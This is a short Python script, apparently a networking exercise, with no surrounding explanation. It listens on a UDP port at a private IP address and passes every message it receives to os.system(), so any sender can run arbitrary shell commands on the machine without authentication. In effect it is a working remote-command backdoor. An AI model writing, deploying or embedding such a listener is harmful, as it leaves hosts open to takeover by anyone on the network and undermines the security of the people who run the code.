import socket
import os
s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
ip = "192.168.43.198"
port = 1234
s.bind((ip , port))

while True:
    x = s.recvfrom(1024)
    clientip = x[1][0]

    data = x[0].decode()

    print(clientip + ":" + data)
    print(os.system(data))

